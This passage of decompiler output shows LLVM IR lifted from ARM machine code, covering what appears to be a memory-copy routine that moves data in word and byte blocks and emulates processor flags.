  store i32 %v12_13d60, i32* %r0.global-to-local, align 4
  %v0_13d64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d64 = inttoptr i32 %v0_13d64 to i32*
  %v2_13d64 = load i32, i32* %v1_13d64, align 4
  store i32 %v2_13d64, i32* %r3.global-to-local, align 4
  %v3_13d64 = add i32 %v0_13d64, 4
  %v4_13d64 = inttoptr i32 %v3_13d64 to i32*
  %v5_13d64 = load i32, i32* %v4_13d64, align 4
  store i32 %v5_13d64, i32* %r4.global-to-local, align 4
  %v6_13d64 = add i32 %v0_13d64, 8
  %v7_13d64 = inttoptr i32 %v6_13d64 to i32*
  %v8_13d64 = load i32, i32* %v7_13d64, align 4
  store i32 %v8_13d64, i32* @ip, align 4
  %v9_13d64 = add i32 %v0_13d64, 12
  %v10_13d64 = inttoptr i32 %v9_13d64 to i32*
  %v11_13d64 = load i32, i32* %v10_13d64, align 4
  store i32 %v11_13d64, i32* @lr, align 4
  %v12_13d64 = add i32 %v0_13d64, 16
  store i32 %v12_13d64, i32* @r1, align 4
  %v1_13d68 = inttoptr i32 %v12_13d60 to i32*
  store i32 %v2_13d64, i32* %v1_13d68, align 4
  %v3_13d68 = add i32 %v0_13d60, 20
  %v4_13d68 = inttoptr i32 %v3_13d68 to i32*
  %v5_13d68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13d68, i32* %v4_13d68, align 4
  %v6_13d68 = add i32 %v0_13d60, 24
  %v7_13d68 = inttoptr i32 %v6_13d68 to i32*
  %v8_13d68 = load i32, i32* @ip, align 4
  store i32 %v8_13d68, i32* %v7_13d68, align 4
  %v9_13d68 = add i32 %v0_13d60, 28
  %v10_13d68 = inttoptr i32 %v9_13d68 to i32*
  %v11_13d68 = load i32, i32* @lr, align 4
  store i32 %v11_13d68, i32* %v10_13d68, align 4
  %v12_13d68 = add i32 %v0_13d60, 32
  store i32 %v12_13d68, i32* @r0, align 4
  %v0_13d6c = load i32, i32* %r2.global-to-local, align 4
  %v2_13d6c = add i32 %v0_13d6c, -32
  store i32 %v2_13d6c, i32* %r2.global-to-local, align 4
  %v6_13d70 = icmp slt i32 %v0_13d6c, 32
  br i1 %v6_13d70, label %dec_label_pc_13d74, label %dec_label_pc_13d5c.dec_label_pc_13d5c_crit_edge

dec_label_pc_13d5c.dec_label_pc_13d5c_crit_edge:  ; preds = %dec_label_pc_13d5c
  %v0_13d5c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d74:                               ; preds = %dec_label_pc_13d5c
  %v4_13d74 = add i32 %v0_13d6c, -16
  %v6_13d74 = add i32 %v0_13d6c, 2147483616
  %v7_13d74 = and i32 %v4_13d74, %v6_13d74
  %v8_13d74 = icmp slt i32 %v7_13d74, 0
  store i1 %v8_13d74, i1* %cpsr_v.global-to-local, align 1
  %v9_13d74 = icmp slt i32 %v4_13d74, 0
  store i1 %v9_13d74, i1* %cpsr_n.global-to-local, align 1
  %v10_13d74 = icmp eq i32 %v4_13d74, 0
  store i1 %v10_13d74, i1* %cpsr_z.global-to-local, align 1
  %v5_13d78 = icmp slt i32 %v2_13d6c, -16
  br i1 %v5_13d78, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_13d74
  %v6_13d78 = load i32, i32* @r1, align 4
  %v7_13d78 = inttoptr i32 %v6_13d78 to i32*
  %v8_13d78 = load i32, i32* %v7_13d78, align 4
  store i32 %v8_13d78, i32* %r3.global-to-local, align 4
  %v9_13d78 = add i32 %v6_13d78, 4
  %v10_13d78 = inttoptr i32 %v9_13d78 to i32*
  %v11_13d78 = load i32, i32* %v10_13d78, align 4
  store i32 %v11_13d78, i32* %r4.global-to-local, align 4
  %v12_13d78 = add i32 %v6_13d78, 8
  %v13_13d78 = inttoptr i32 %v12_13d78 to i32*
  %v14_13d78 = load i32, i32* %v13_13d78, align 4
  store i32 %v14_13d78, i32* @ip, align 4
  %v15_13d78 = add i32 %v6_13d78, 12
  %v16_13d78 = inttoptr i32 %v15_13d78 to i32*
  %v17_13d78 = load i32, i32* %v16_13d78, align 4
  store i32 %v17_13d78, i32* @lr, align 4
  %v18_13d78 = add i32 %v6_13d78, 16
  store i32 %v18_13d78, i32* @r1, align 4
  %v7_13d7c = inttoptr i32 %v12_13d68 to i32*
  store i32 %v8_13d78, i32* %v7_13d7c, align 4
  %v9_13d7c = add i32 %v0_13d60, 36
  %v10_13d7c = inttoptr i32 %v9_13d7c to i32*
  %v11_13d7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_13d7c, i32* %v10_13d7c, align 4
  %v12_13d7c = add i32 %v0_13d60, 40
  %v13_13d7c = inttoptr i32 %v12_13d7c to i32*
  %v14_13d7c = load i32, i32* @ip, align 4
  store i32 %v14_13d7c, i32* %v13_13d7c, align 4
  %v15_13d7c = add i32 %v0_13d60, 44
  %v16_13d7c = inttoptr i32 %v15_13d7c to i32*
  %v17_13d7c = load i32, i32* @lr, align 4
  store i32 %v17_13d7c, i32* %v16_13d7c, align 4
  %v18_13d7c = add i32 %v0_13d60, 48
  store i32 %v18_13d7c, i32* @r0, align 4
  %v6_13d80 = load i32, i32* %r2.global-to-local, align 4
  %v7_13d80 = add i32 %v6_13d80, -16
  store i32 %v7_13d80, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13d74, %bb128
  %v3_13d90101 = phi i32 [ %v12_13d68, %dec_label_pc_13d74 ], [ %v18_13d7c, %bb128 ]
  %v0_13d8895 = phi i32 [ %v2_13d6c, %dec_label_pc_13d74 ], [ %v7_13d80, %bb128 ]
  %v2_13d84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13d84, i32* @r4, align 4
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d50, %.thread1
  %v3_13d90100 = phi i32 [ %v0_13d6092, %dec_label_pc_13d50 ], [ %v3_13d90101, %.thread1 ]
  %v0_13d88 = phi i32 [ %v2_13d50, %dec_label_pc_13d50 ], [ %v0_13d8895, %.thread1 ]
  %v1_13d88 = add i32 %v0_13d88, 20
  store i32 %v1_13d88, i32* %r2.global-to-local, align 4
  %v3_13d88 = sub i32 0, %v0_13d88
  %v4_13d88 = and i32 %v1_13d88, %v3_13d88
  %v5_13d88 = icmp slt i32 %v4_13d88, 0
  store i1 %v5_13d88, i1* %cpsr_v.global-to-local, align 1
  %v6_13d88 = icmp slt i32 %v1_13d88, 0
  store i1 %v6_13d88, i1* %cpsr_n.global-to-local, align 1
  %v7_13d88 = icmp eq i32 %v1_13d88, 0
  store i1 %v7_13d88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d8c

dec_label_pc_13d8c:                               ; preds = %.thread117, %dec_label_pc_13d88
  %v0_13d9c.pre147 = phi i32 [ %v0_13d9c.pre, %.thread117 ], [ %v1_13d88, %dec_label_pc_13d88 ]
  %v3_13d90 = phi i32 [ %v3_13d9098118, %.thread117 ], [ %v3_13d90100, %dec_label_pc_13d88 ]
  %v1_13d94 = phi i1 [ %v1_13d98, %.thread117 ], [ %v5_13d88, %dec_label_pc_13d88 ]
  %v0_13d94 = phi i1 [ %v0_13d98, %.thread117 ], [ %v6_13d88, %dec_label_pc_13d88 ]
  %v2_13d8c = xor i1 %v1_13d94, %v0_13d94
  br i1 %v2_13d8c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_13d8c
  %v3_13d8c = load i32, i32* @r1, align 4
  %v4_13d8c = inttoptr i32 %v3_13d8c to i32*
  %v5_13d8c = load i32, i32* %v4_13d8c, align 4
  store i32 %v5_13d8c, i32* %r3.global-to-local, align 4
  %v6_13d8c = add i32 %v3_13d8c, 4
  %v7_13d8c = inttoptr i32 %v6_13d8c to i32*
  %v8_13d8c = load i32, i32* %v7_13d8c, align 4
  store i32 %v8_13d8c, i32* @ip, align 4
  %v9_13d8c = add i32 %v3_13d8c, 8
  %v10_13d8c = inttoptr i32 %v9_13d8c to i32*
  %v11_13d8c = load i32, i32* %v10_13d8c, align 4
  store i32 %v11_13d8c, i32* @lr, align 4
  %v12_13d8c = add i32 %v3_13d8c, 12
  store i32 %v12_13d8c, i32* @r1, align 4
  %v4_13d90 = inttoptr i32 %v3_13d90 to i32*
  store i32 %v5_13d8c, i32* %v4_13d90, align 4
  %v6_13d90 = add i32 %v3_13d90, 4
  %v7_13d90 = inttoptr i32 %v6_13d90 to i32*
  %v8_13d90 = load i32, i32* @ip, align 4
  store i32 %v8_13d90, i32* %v7_13d90, align 4
  %v9_13d90 = add i32 %v3_13d90, 8
  %v10_13d90 = inttoptr i32 %v9_13d90 to i32*
  %v11_13d90 = load i32, i32* @lr, align 4
  store i32 %v11_13d90, i32* %v10_13d90, align 4
  %v12_13d90 = add i32 %v3_13d90, 12
  store i32 %v12_13d90, i32* @r0, align 4
  %v3_13d94 = load i32, i32* %r2.global-to-local, align 4
  %v4_13d94 = add i32 %v3_13d94, -12
  store i32 %v4_13d94, i32* %r2.global-to-local, align 4
  %v6_13d94 = sub i32 11, %v3_13d94
  %v7_13d94 = and i32 %v6_13d94, %v3_13d94
  %v8_13d94 = icmp slt i32 %v7_13d94, 0
  store i1 %v8_13d94, i1* %cpsr_v.global-to-local, align 1
  %v9_13d94 = icmp slt i32 %v4_13d94, 0
  store i1 %v9_13d94, i1* %cpsr_n.global-to-local, align 1
  %v10_13d94 = icmp eq i32 %v3_13d94, 12
  store i1 %v10_13d94, i1* %cpsr_z.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_13d8c, %bb129
  %v0_13d9c.pre = phi i32 [ %v4_13d94, %bb129 ], [ %v0_13d9c.pre147, %dec_label_pc_13d8c ]
  %v3_13d9098118 = phi i32 [ %v12_13d90, %bb129 ], [ %v3_13d90, %dec_label_pc_13d8c ]
  %v1_13d98 = phi i1 [ %v8_13d94, %bb129 ], [ %v1_13d94, %dec_label_pc_13d8c ]
  %v0_13d98 = phi i1 [ %v9_13d94, %bb129 ], [ %v0_13d94, %dec_label_pc_13d8c ]
  %v2_13d98 = xor i1 %v1_13d98, %v0_13d98
  br i1 %v2_13d98, label %dec_label_pc_13d9c, label %dec_label_pc_13d8c

dec_label_pc_13d9c:                               ; preds = %.thread117, %dec_label_pc_13d48
  %v7_13dac = phi i32 [ %v0_13d6092, %dec_label_pc_13d48 ], [ %v3_13d9098118, %.thread117 ]
  %v0_13d9c = phi i32 [ %v2_13d48, %dec_label_pc_13d48 ], [ %v0_13d9c.pre, %.thread117 ]
  %v2_13d9c = add i32 %v0_13d9c, 8
  store i32 %v2_13d9c, i32* %r2.global-to-local, align 4
  %v4_13d9c = sub i32 0, %v0_13d9c
  %v5_13d9c = and i32 %v2_13d9c, %v4_13d9c
  %v6_13d9c = icmp slt i32 %v5_13d9c, 0
  store i1 %v6_13d9c, i1* %cpsr_v.global-to-local, align 1
  %v7_13d9c = icmp slt i32 %v2_13d9c, 0
  store i1 %v7_13d9c, i1* %cpsr_n.global-to-local, align 1
  %v8_13d9c = icmp eq i32 %v2_13d9c, 0
  store i1 %v8_13d9c, i1* %cpsr_z.global-to-local, align 1
  %v5_13da0 = icmp slt i32 %v0_13d9c, -8
  br i1 %v5_13da0, label %bb131, label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13d9c
  %v6_13da4 = add i32 %v0_13d9c, 4
  store i32 %v6_13da4, i32* %r2.global-to-local, align 4
  %v8_13da4 = sub i32 -5, %v0_13d9c
  %v9_13da4 = and i32 %v8_13da4, %v2_13d9c
  %v10_13da4 = icmp slt i32 %v9_13da4, 0
  store i1 %v10_13da4, i1* %cpsr_v.global-to-local, align 1
  %v11_13da4 = icmp slt i32 %v6_13da4, 0
  store i1 %v11_13da4, i1* %cpsr_n.global-to-local, align 1
  %v12_13da4 = icmp eq i32 %v2_13d9c, 4
  store i1 %v12_13da4, i1* %cpsr_z.global-to-local, align 1
  %v5_13da8 = icmp slt i32 %v2_13d9c, 4
  %v6_13da8 = load i32, i32* @r1, align 4
  %v7_13da8 = inttoptr i32 %v6_13da8 to i32*
  %v8_13da8 = load i32, i32* %v7_13da8, align 4
  store i32 %v8_13da8, i32* %r3.global-to-local, align 4
  %v10_13da8 = add i32 %v6_13da8, 4
  br i1 %v5_13da8, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_13da4
  store i32 %v10_13da8, i32* @r1, align 4
  %v8_13dac = inttoptr i32 %v7_13dac to i32*
  store i32 %v8_13da8, i32* %v8_13dac, align 4
  %v9_13dac = load i32, i32* @r0, align 4
  %v10_13dac = add i32 %v9_13dac, 4
  store i32 %v10_13dac, i32* @r0, align 4
  %v0_13dbc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_13da4
  %v10_13db0 = inttoptr i32 %v10_13da8 to i32*
  %v11_13db0 = load i32, i32* %v10_13db0, align 4
  store i32 %v11_13db0, i32* @ip, align 4
  %v12_13db0 = add i32 %v6_13da8, 8
  store i32 %v12_13db0, i32* @r1, align 4
  %v7_13db4 = inttoptr i32 %v7_13dac to i32*
  store i32 %v8_13da8, i32* %v7_13db4, align 4
  %v9_13db4 = add i32 %v7_13dac, 4
  %v10_13db4 = inttoptr i32 %v9_13db4 to i32*
  %v11_13db4 = load i32, i32* @ip, align 4
  store i32 %v11_13db4, i32* %v10_13db4, align 4
  %v12_13db4 = add i32 %v7_13dac, 8
  store i32 %v12_13db4, i32* @r0, align 4
  %v6_13db8 = load i32, i32* %r2.global-to-local, align 4
  %v7_13db8 = add i32 %v6_13db8, -4
  store i32 %v7_13db8, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_13d9c, %bb, %dec_label_pc_13f64, %dec_label_pc_13ef8, %dec_label_pc_13e8c, %bb130
  %v2_13dcc = phi i32 [ %v10_13dac, %.thread5 ], [ %v0_13e5c75, %.thread11 ], [ %v7_13dac, %dec_label_pc_13d9c ], [ %v1_13d20, %bb ], [ %v2_13dcc113, %dec_label_pc_13f64 ], [ %v2_13dcc112, %dec_label_pc_13ef8 ], [ %v2_13dcc111, %dec_label_pc_13e8c ], [ %v12_13db4, %bb130 ]
  %v0_13dbc = phi i32 [ %v0_13dbc.pre, %.thread5 ], [ %v2_13e04, %.thread11 ], [ %v2_13d9c, %dec_label_pc_13d9c ], [ %v2_13d30, %bb ], [ %v0_13dbc109, %dec_label_pc_13f64 ], [ %v0_13dbc108, %dec_label_pc_13ef8 ], [ %v0_13dbc107, %dec_label_pc_13e8c ], [ %v7_13db8, %bb130 ]
  %v1_13dbc = add i32 %v0_13dbc, 4
  store i32 %v1_13dbc, i32* %r2.global-to-local, align 4
  %v3_13dbc = sub i32 0, %v0_13dbc
  %v4_13dbc = and i32 %v1_13dbc, %v3_13dbc
  %v5_13dbc = icmp slt i32 %v4_13dbc, 0
  store i1 %v5_13dbc, i1* %cpsr_v.global-to-local, align 1
  %v6_13dbc = icmp slt i32 %v1_13dbc, 0
  store i1 %v6_13dbc, i1* %cpsr_n.global-to-local, align 1
  %v7_13dbc = icmp eq i32 %v1_13dbc, 0
  store i1 %v7_13dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13dbc, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_13dc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_13dc0, i32* %r0.global-to-local, align 4
  ret i32 %v3_13dc0

bb133:                                            ; preds = %bb131
  %v1_13dc4 = add i32 %v0_13dbc, 2
  %v3_13dc4 = sub i32 -3, %v0_13dbc
  %v4_13dc4 = and i32 %v3_13dc4, %v1_13dbc
  %v5_13dc4 = icmp slt i32 %v4_13dc4, 0
  store i1 %v5_13dc4, i1* %cpsr_v.global-to-local, align 1
  %v6_13dc4 = icmp slt i32 %v1_13dc4, 0
  store i1 %v6_13dc4, i1* %cpsr_n.global-to-local, align 1
  %v7_13dc4 = icmp eq i32 %v1_13dbc, 2
  store i1 %v7_13dc4, i1* %cpsr_z.global-to-local, align 1
  %v0_13dc8 = load i32, i32* @r1, align 4
  %v1_13dc8 = inttoptr i32 %v0_13dc8 to i8*
  %v2_13dc8 = load i8, i8* %v1_13dc8, align 1
  %v3_13dc8 = zext i8 %v2_13dc8 to i32
  store i32 %v3_13dc8, i32* %r3.global-to-local, align 4
  %v5_13dc8 = add i32 %v0_13dc8, 1
  store i32 %v5_13dc8, i32* %r1.global-to-local, align 4
  %v3_13dcc = inttoptr i32 %v2_13dcc to i8*
  store i8 %v2_13dc8, i8* %v3_13dcc, align 1
  %v4_13dcc = load i32, i32* @r0, align 4
  %v5_13dcc = add i32 %v4_13dcc, 1
  store i32 %v5_13dcc, i32* %r0.global-to-local, align 4
  %v0_13dd0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_13dd0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_13dd0 = xor i1 %v0_13dd0, %v1_13dd0
  br i1 %v2_13dd0, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_13dd0 = load i32, i32* %r1.global-to-local, align 4
  %v4_13dd0 = inttoptr i32 %v3_13dd0 to i8*
  %v5_13dd0 = load i8, i8* %v4_13dd0, align 1
  %v6_13dd0 = zext i8 %v5_13dd0 to i32
  store i32 %v6_13dd0, i32* %r3.global-to-local, align 4
  %v8_13dd0 = add i32 %v3_13dd0, 1
  store i32 %v8_13dd0, i32* %r1.global-to-local, align 4
  %v6_13dd4 = inttoptr i32 %v5_13dcc to i8*
  store i8 %v5_13dd0, i8* %v6_13dd4, align 1
  %v7_13dd4 = load i32, i32* %r0.global-to-local, align 4
  %v8_13dd4 = add i32 %v7_13dd4, 1
  store i32 %v8_13dd4, i32* %r0.global-to-local, align 4
  %v1_13dd8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13dd8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_13ddc = phi i32 [ %v8_13dd4, %bb134 ], [ %v5_13dcc, %bb133 ]
  %v2_13ddc = phi i1 [ %v2_13dd8.pre, %bb134 ], [ %v1_13dd0, %bb133 ]
  %v1_13ddc = phi i1 [ %v1_13dd8.pre, %bb134 ], [ %v0_13dd0, %bb133 ]
  %v0_13dd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13dd8 = xor i1 %v2_13ddc, %v1_13ddc
  %v4_13dd8 = or i1 %v0_13dd8, %v3_13dd8
  br i1 %v4_13dd8, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_13dd8 = load i32, i32* %r1.global-to-local, align 4
  %v6_13dd8 = inttoptr i32 %v5_13dd8 to i8*
  %v7_13dd8 = load i8, i8* %v6_13dd8, align 1
  %v8_13dd8 = zext i8 %v7_13dd8 to i32
  store i32 %v8_13dd8, i32* %r3.global-to-local, align 4
  %v10_13dd8 = add i32 %v5_13dd8, 1
  store i32 %v10_13dd8, i32* %r1.global-to-local, align 4
  %v8_13ddc = inttoptr i32 %v7_13ddc to i8*
  store i8 %v7_13dd8, i8* %v8_13ddc, align 1
  %v9_13ddc = load i32, i32* %r0.global-to-local, align 4
  %v10_13ddc = add i32 %v9_13ddc, 1
  store i32 %v10_13ddc, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_13de0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13de0, i32* %r0.global-to-local, align 4
  ret i32 %v2_13de0

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13d38
  %v1_13de4 = sub nsw i32 4, %v1_13d38
  store i32 %v1_13de4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_13de8 = icmp ult i32 %v1_13de4, 2
  store i1 %v8_13de8, i1* %cpsr_n.global-to-local, align 1
  %v9_13de8 = icmp eq i32 %v1_13de4, 2
  store i1 %v9_13de8, i1* %cpsr_z.global-to-local, align 1
  %v1_13dec = inttoptr i32 %v0_13d20 to i8*
  %v2_13dec = load i8, i8* %v1_13dec, align 1
  %v3_13dec = zext i8 %v2_13dec to i32
  store i32 %v3_13dec, i32* %r3.global-to-local, align 4
  %v5_13dec = add i32 %v0_13d20, 1
  store i32 %v5_13dec, i32* @r1, align 4
  %v3_13df0 = inttoptr i32 %v1_13d20 to i8*
  store i8 %v2_13dec, i8* %v3_13df0, align 1
  %v4_13df0 = load i32, i32* @r0, align 4
  %v5_13df0 = add i32 %v4_13df0, 1
  store i32 %v5_13df0, i32* @r0, align 4
  br i1 %v8_13de8, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_13de4
  %v6_13df4 = load i32, i32* @r1, align 4
  %v7_13df4 = inttoptr i32 %v6_13df4 to i8*
  %v8_13df4 = load i8, i8* %v7_13df4, align 1
  %v9_13df4 = zext i8 %v8_13df4 to i32
  store i32 %v9_13df4, i32* %r3.global-to-local, align 4
  %v11_13df4 = add i32 %v6_13df4, 1
  store i32 %v11_13df4, i32* @r1, align 4
  %v9_13df8 = inttoptr i32 %v5_13df0 to i8*
  store i8 %v8_13df4, i8* %v9_13df8, align 1
  %v10_13df8 = load i32, i32* @r0, align 4
  %v11_13df8 = add i32 %v10_13df8, 1
  store i32 %v11_13df8, i32* @r0, align 4
  br i1 %v9_13de8, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_13dfc = load i32, i32* @r1, align 4
  %v9_13dfc = inttoptr i32 %v8_13dfc to i8*
  %v10_13dfc = load i8, i8* %v9_13dfc, align 1
  %v11_13dfc = zext i8 %v10_13dfc to i32
  store i32 %v11_13dfc, i32* %r3.global-to-local, align 4
  %v13_13dfc = add i32 %v8_13dfc, 1
  store i32 %v13_13dfc, i32* @r1, align 4
  %v11_13e00 = inttoptr i32 %v11_13df8 to i8*
  store i8 %v10_13dfc, i8* %v11_13e00, align 1
  %v12_13e00 = load i32, i32* @r0, align 4
  %v13_13e00 = add i32 %v12_13e00, 1
  store i32 %v13_13e00, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_13de4, %bb137
  %v0_13e5c75 = phi i32 [ %v11_13df8, %bb136 ], [ %v5_13df0, %dec_label_pc_13de4 ], [ %v13_13e00, %bb137 ]
  %v0_13e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e04 = load i32, i32* @ip, align 4
  %v2_13e04 = sub i32 %v0_13e04, %v1_13e04
  store i32 %v2_13e04, i32* %r2.global-to-local, align 4
  %v4_13e04 = xor i32 %v1_13e04, %v0_13e04
  %v5_13e04 = xor i32 %v2_13e04, %v0_13e04
  %v6_13e04 = and i32 %v5_13e04, %v4_13e04
  %v7_13e04 = icmp slt i32 %v6_13e04, 0
  store i1 %v7_13e04, i1* %cpsr_v.global-to-local, align 1
  %v8_13e04 = icmp slt i32 %v2_13e04, 0
  store i1 %v8_13e04, i1* %cpsr_n.global-to-local, align 1
  %v9_13e04 = icmp eq i32 %v0_13e04, %v1_13e04
  store i1 %v9_13e04, i1* %cpsr_z.global-to-local, align 1
  %v5_13e08 = icmp slt i32 %v0_13e04, %v1_13e04
  br i1 %v5_13e08, label %bb131, label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %.thread11
  %v0_13e0c = load i32, i32* @r1, align 4
  %v1_13e0c = urem i32 %v0_13e0c, 4
  store i32 %v1_13e0c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13e0c = icmp eq i32 %v1_13e0c, 0
  store i1 %v2_13e0c, i1* %cpsr_z.global-to-local, align 1
  %extract.t123 = trunc i32 %v0_13e0c to i2
  br i1 %v2_13e0c, label %dec_label_pc_13d48, label %dec_label_pc_13e14

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13d40, %dec_label_pc_13e0c
  %v0_13e5c74 = phi i32 [ %v1_13d20, %dec_label_pc_13d40 ], [ %v0_13e5c75, %dec_label_pc_13e0c ]
  %v0_13f08 = phi i32 [ %v2_13d30, %dec_label_pc_13d40 ], [ %v2_13e04, %dec_label_pc_13e0c ]
  %v0_13e1c.off0 = phi i2 [ %extract.t, %dec_label_pc_13d40 ], [ %extract.t123, %dec_label_pc_13e0c ]
  %v0_13e14 = phi i32 [ %v0_13d20, %dec_label_pc_13d40 ], [ %v0_13e0c, %dec_label_pc_13e0c ]
  %v1_13e14 = and i32 %v0_13e14, -4
  store i32 %v1_13e14, i32* %r1.global-to-local, align 4
  %v1_13e18 = inttoptr i32 %v1_13e14 to i32*
  %v2_13e18 = load i32, i32* %v1_13e18, align 4
  store i32 %v2_13e18, i32* @lr, align 4
  %v4_13e18 = add i32 %v1_13e14, 4
  store i32 %v4_13e18, i32* %r1.global-to-local, align 4
  %v2_13f00 = add i32 %v0_13f08, -12
  %v4_13f00 = sub i32 11, %v0_13f08
  %v5_13f00 = and i32 %v4_13f00, %v0_13f08
  %v6_13f00 = icmp slt i32 %v5_13f00, 0
  store i1 %v6_13f00, i1* %cpsr_v.global-to-local, align 1
  %v7_13f00 = icmp slt i32 %v2_13f00, 0
  store i1 %v7_13f00, i1* %cpsr_n.global-to-local, align 1
  %v8_13f00 = icmp eq i32 %v0_13f08, 12
  store i1 %v8_13f00, i1* %cpsr_z.global-to-local, align 1
  %v5_13f04 = icmp slt i32 %v0_13f08, 12
  switch i2 %v0_13e1c.off0, label %dec_label_pc_13e28 [
    i2 -1, label %dec_label_pc_13f00
    i2 -2, label %dec_label_pc_13e94
  ]

dec_label_pc_13e28:                               ; preds = %dec_label_pc_13e14
  br i1 %v5_13f04, label %dec_label_pc_13e74, label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e28
  store i32 %v2_13f00, i32* %r2.global-to-local, align 4
  %v3_13e34 = load i32, i32* @r4, align 4
  store i32 %v3_13e34, i32* %stack_var_-16, align 4
  %v6_13e34 = load i32, i32* @r5, align 4
  store i32 %v6_13e34, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13e38

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e38.dec_label_pc_13e38_crit_edge, %dec_label_pc_13e30
  %v0_13e5c = phi i32 [ %v12_13e5c, %dec_label_pc_13e38.dec_label_pc_13e38_crit_edge ], [ %v0_13e5c74, %dec_label_pc_13e30 ]
  %v0_13e3c = phi i32 [ %v0_13e3c.pre, %dec_label_pc_13e38.dec_label_pc_13e38_crit_edge ], [ %v4_13e18, %dec_label_pc_13e30 ]
  %v0_13e38 = phi i32 [ %v0_13e38.pre, %dec_label_pc_13e38.dec_label_pc_13e38_crit_edge ], [ %v2_13e18, %dec_label_pc_13e30 ]
  %v3_13e38 = udiv i32 %v0_13e38, 256
  store i32 %v3_13e38, i32* %r3.global-to-local, align 4
  %v1_13e3c = inttoptr i32 %v0_13e3c to i32*
  %v2_13e3c = load i32, i32* %v1_13e3c, align 4
  store i32 %v2_13e3c, i32* %r4.global-to-local, align 4
  %v3_13e3c = add i32 %v0_13e3c, 4
  %v4_13e3c = inttoptr i32 %v3_13e3c to i32*
  %v5_13e3c = load i32, i32* %v4_13e3c, align 4
  store i32 %v5_13e3c, i32* %r5.global-to-local, align 4
  %v6_13e3c = add i32 %v0_13e3c, 8
  %v7_13e3c = inttoptr i32 %v6_13e3c to i32*
  %v8_13e3c = load i32, i32* %v7_13e3c, align 4
  store i32 %v8_13e3c, i32* %ip.global-to-local, align 4
  %v9_13e3c = add i32 %v0_13e3c, 12
  %v10_13e3c = inttoptr i32 %v9_13e3c to i32*
  %v11_13e3c = load i32, i32* %v10_13e3c, align 4
  store i32 %v11_13e3c, i32* @lr, align 4
  %v12_13e3c = add i32 %v0_13e3c, 16
  store i32 %v12_13e3c, i32* %r1.global-to-local, align 4
  %v4_13e40 = mul i32 %v2_13e3c, 16777216
  %v5_13e40 = or i32 %v4_13e40, %v3_13e38
  store i32 %v5_13e40, i32* %r3.global-to-local, align 4
  %v3_13e44 = udiv i32 %v2_13e3c, 256
  %v4_13e48 = mul i32 %v5_13e3c, 16777216
  %v5_13e48 = or i32 %v4_13e48, %v3_13e44
  store i32 %v5_13e48, i32* %r4.global-to-local, align 4
  %v3_13e4c = udiv i32 %v5_13e3c, 256
  %v4_13e50 = mul i32 %v8_13e3c, 16777216
  %v5_13e50 = or i32 %v4_13e50, %v3_13e4c
  store i32 %v5_13e50, i32* %r5.global-to-local, align 4
  %v3_13e54 = udiv i32 %v8_13e3c, 256
  %v4_13e58 = mul i32 %v11_13e3c, 16777216
  %v5_13e58 = or i32 %v4_13e58, %v3_13e54
  store i32 %v5_13e58, i32* @ip, align 4
  %v1_13e5c = inttoptr i32 %v0_13e5c to i32*
  store i32 %v5_13e40, i32* %v1_13e5c, align 4
  %v3_13e5c = add i32 %v0_13e5c, 4
  %v4_13e5c = inttoptr i32 %v3_13e5c to i32*
  %v5_13e5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13e5c, i32* %v4_13e5c, align 4
  %v6_13e5c = add i32 %v0_13e5c, 8
  %v7_13e5c = inttoptr i32 %v6_13e5c to i32*
  %v8_13e5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13e5c, i32* %v7_13e5c, align 4
  %v9_13e5c = add i32 %v0_13e5c, 12
  %v10_13e5c = inttoptr i32 %v9_13e5c to i32*
  %v11_13e5c = load i32, i32* @ip, align 4
  store i32 %v11_13e5c, i32* %v10_13e5c, align 4
  %v12_13e5c = add i32 %v0_13e5c, 16
  store i32 %v12_13e5c, i32* @r0, align 4
  %v0_13e60 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e60 = add i32 %v0_13e60, -16
